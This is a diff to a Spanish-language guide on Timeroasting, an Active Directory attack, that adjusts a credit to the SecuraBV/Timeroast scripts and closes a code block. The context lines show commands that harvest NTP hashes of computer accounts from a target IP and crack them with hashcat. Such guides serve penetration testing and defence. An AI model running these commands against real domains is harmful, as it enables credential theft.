@@ -30,7 +30,9 @@ El checksum criptográfico se calcula utilizando MD5, y el proceso específico s
 
 Cita a https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-roasting-timeroasting/
 
-[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Scripts de Timeroasting de Tom Tervoort
+[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Scripts de Timeroasting por Tom Tervoort
 ```
 sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
 hashcat -m 31300 ntp-hashes.txt
+```
+
